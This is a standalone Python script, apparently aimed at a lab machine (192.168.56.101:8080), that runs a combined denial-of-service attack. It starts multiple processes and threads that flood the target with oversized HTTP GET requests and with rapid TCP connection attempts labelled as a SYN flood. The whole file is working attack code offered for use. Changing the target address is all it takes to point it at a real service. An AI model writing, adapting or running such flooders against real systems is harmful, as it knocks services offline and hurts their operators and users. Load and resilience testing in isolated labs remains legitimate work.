#!/usr/bin/env python3

import socket
import signal
import sys
import multiprocessing
import threading

TARGET = '192.168.56.101'
PORT = 8080
PROCESSES = 2          
THREADS = 50           
running = True

def cleanup(sig=None, frame=None):
    global running
    print("\n[!] Stopping all attacks...")
    running = False
    sys.exit(0)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)


def http_attack():
    while running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((TARGET, PORT))
            payload = f"GET /?{'X'*1000} HTTP/1.1\r\nHost:{TARGET}\r\n\r\n"
            s.send(payload.encode())
            s.recv(1)
            s.close()
        except:
            pass


def syn_attack():
    while running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setblocking(False)
            s.connect_ex((TARGET, PORT))
            s.close()
        except:
            pass


def worker(attack_func):
    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=attack_func, daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

if __name__ == "__main__":
    print("=" * 50)
    print("   COMBINED DoS ATTACK (HTTP + SYN FLOOD)")
    print("=" * 50)
    print(f"[*] Target: {TARGET}:{PORT}")
    print(f"[*] HTTP attackers: {PROCESSES * THREADS}")
    print(f"[*] SYN attackers: {PROCESSES * THREADS}")
    print(f"[*] Total: {PROCESSES * THREADS * 2} attackers")
    print("[*] Press CTRL+C to stop\n")
    print("[!] ATTACK RUNNING...\n")
    
    processes = []
    
    
    for _ in range(PROCESSES):
        p = multiprocessing.Process(target=worker, args=(http_attack,), daemon=True)
        p.start()
        processes.append(p)
        print("[+] HTTP Flood process started")
    
    
    for _ in range(PROCESSES):
        p = multiprocessing.Process(target=worker, args=(syn_attack,), daemon=True)
        p.start()
        processes.append(p)
        print("[+] SYN Flood process started")
    
    try:
        for p in processes:
            p.join()
    except KeyboardInterrupt:
        cleanup()
